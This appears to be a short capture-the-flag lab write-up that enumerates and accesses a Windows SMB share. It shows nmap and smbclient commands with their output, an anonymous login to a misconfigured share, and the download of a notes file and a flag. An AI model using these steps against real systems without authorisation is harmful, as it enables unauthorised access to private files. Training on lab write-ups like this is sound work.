# SMB Server Mesasge Block (Windows)

## Scan

```bash
nmap -sV -T5 10.129.153.104
```

```text
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

We can exploit SMB server, running on port 445.
~~using windows is such a bad choice haha~~

## Exploit

```bash
smbclient -L 10.129.153.104
```

```text
Can't load /etc/samba/smb.conf - run testparm to debug it
Password for [WORKGROUP\wcyat]: (use anempty password)

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
SMB1 disabled -- no workgroup available
```

We try to exploit the custom share first.

```bash
smbclient  \\\\10.129.153.104\\WorkShares
```

Seems like a misconfiguration that we could sucessfully log in (without a valid user & password)

```bash
smb: \> ls
  .                                   D        0  Mon Mar 29 16:22:01 2021
  ..                                  D        0  Mon Mar 29 16:22:01 2021
  Amy.J                               D        0  Mon Mar 29 17:08:24 2021
  James.P                             D        0  Thu Jun  3 16:38:03 2021

                5114111 blocks of size 4096. 1732418 blocks available
smb: \> cd Amy.J
  .                                   D        0  Mon Mar 29 17:08:24 2021
  ..                                  D        0  Mon Mar 29 17:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 19:00:37 2021

                5114111 blocks of size 4096. 1732026 blocks available
smb: \Amy.J\> get worknotes.txt
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
# there's a worknotes.txt, get it first
smb: \Amy.J\> cd ../James.P
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 16:38:03 2021
  ..                                  D        0  Thu Jun  3 16:38:03 2021
  flag.txt                            A       32  Mon Mar 29 17:26:57 2021

                5114111 blocks of size 4096. 1731658 blocks available
smb: \James.P\> get falg.txt
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \James.P\falg.txt
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)
# the flag is here
```
